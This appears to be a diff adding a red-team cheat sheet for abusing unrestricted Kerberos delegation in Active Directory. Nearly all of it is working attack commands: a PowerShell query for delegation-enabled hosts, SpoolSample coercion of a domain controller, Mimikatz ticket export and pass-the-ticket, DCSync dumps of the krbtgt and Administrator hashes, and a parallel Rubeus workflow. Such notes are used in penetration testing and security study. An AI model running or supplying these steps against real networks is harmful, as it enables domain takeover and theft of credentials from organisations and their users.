@@ -1,0 +1,42 @@
+Confirm/find computers on a domain that have unrestricted kerberos delegation: 
+Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description
+
+[Attack using Mimikatz]
+
+Check TGT's:
+mimikatz# sekurlsa::tickets
+
+Get ticket authenticating against the host victim:
+PS C:\Users\Administrator> ls \\dc.domain.com\pipe\spoolss
+PS C:\Users\Administrator> .\SpoolSample.exe dc.domain.com victim.domain.com
+
+See created TGT:
+mimikatz# sekurlsa::tickets 
+
+Export ticket:
+mimikatz# sekurlsa::tickets /export (export ticket)
+
+Load exported ticket:
+mimikatz# kerberos::ptt C:\Users\Administrator\Desktop\mimikatz\[SAVED-TICKET]-Administrator@krbtgt-DOMAIN.LOCAL.kirbi 
+
+Check if TGT is imported on victim:
+PS C:\Users\Administrator> klist tickets (Check if TGT is imported on victim)
+
+DCSYNC to drop krbtgt hash (2 methods):
+1 - PS C:\Users\Administrator> .\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.com /user:krbtgt /csv" "exit"
+2 - #mimikatz lsadump::dcsync /user:Domain\krbtgt 
+
+
+DCSYNC to drop Administrator hash:
+PS C:\Users\Administrator> .\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.com /user:administrator /csv" "exit"
+
+[Attack using Rubeus]
+
+PS C:\Users\Administrator> .\Rubeus.exe monitor /interval:5
+PS C:\Users\Administrator> .\SpoolSample.exe dc03.infinity.com web05.infinity.com
+PS C:\Users\Administrator> .\Rubeus.exe ptt /ticket:[BASE64_HERE]
+PS C:\Users\Administrator> .\Rubeus.exe klist
+Make DCSYNC.
+
+
+
